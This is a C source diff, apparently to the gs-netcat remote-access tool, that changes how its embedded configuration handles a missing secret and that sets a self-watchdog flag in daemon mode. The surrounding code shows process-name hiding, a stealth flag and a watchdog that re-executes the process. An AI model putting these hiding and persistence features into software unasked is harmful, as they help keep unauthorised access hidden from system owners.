@@ -66,10 +66,10 @@ GSNC_config_write(const char *fn) {
         return 254;
     }
 
-    if (gopt.sec_str == NULL) {
-        fprintf(stderr, "-s or GS_SECRET not specified\n");
-        return 253;
-    }
+    // if (gopt.sec_str == NULL) {
+    //     fprintf(stderr, "-s or GS_SECRET not specified\n");
+    //     return 253;
+    // }
 
     if ((fn[0] == '-') && (fn[1] == '\0'))
         fp = stdout;
@@ -93,7 +93,8 @@ GSNC_config_write(const char *fn) {
         c.magic[i] = buf[i] ^ GSNC_CONFIG_MAGIC_XOR;
     }
 
-    snprintf(c.sec_str, sizeof c.sec_str, "%s", gopt.sec_str);
+    if (gopt.sec_str != NULL)
+        snprintf(c.sec_str, sizeof c.sec_str, "%s", gopt.sec_str);
 
     if ((ptr = GS_GETENV2("PROC_HIDDENNAME")) != NULL)
         snprintf(c.proc_hiddenname, sizeof c.proc_hiddenname, "%s", ptr);
@@ -195,8 +196,11 @@ GSNC_config_read(const char *fn) {
             gopt.gs_port = atoi(ptr);
     }
 
-    if (gopt.sec_str == NULL)
+    if (gopt.sec_str == NULL) {
+        if (c.sec_str[0] == '\0')
+            goto err; // EMPTY string and no SECRET via -s or env.
         gopt.sec_str = strdup(c.sec_str);
+    }
 
     if ((gopt.gs_host == NULL) && (c.host[0] != '\0'))
         gopt.gs_host = strdup(c.host);
@@ -231,6 +235,8 @@ GSNC_config_read(const char *fn) {
     gopt.is_interactive = 1;
     gopt.flags |= GSC_FL_IS_SERVER;
     gopt.flags |= GSC_FL_IS_STEALTH;
+    if (gopt.flags & GSC_FL_OPT_DAEMON)
+        gopt.flags |= GSC_FL_SELF_WATCHDOG;
 
     gopt.flags |= GSC_FL_CONFIG_READ_OK;
     ret = 0;
@@ -600,7 +606,7 @@ SWD_reexec(void) {
 	return;
 }
 
-// Called to initilize SWD.
+// Called to initialize SWD.
 // Called after re-exec by SWD_reexec().
 void
 SWD_wait(void) {
@@ -668,5 +674,4 @@ SWD_wait(void) {
     sleep(n);
     gettimeofday(&gopt.tv_now, NULL);
     swd.last_sec = gopt.tv_now.tv_sec;
-    gopt.flags |= GSC_FL_SELF_WATCHDOG; // implied
 }
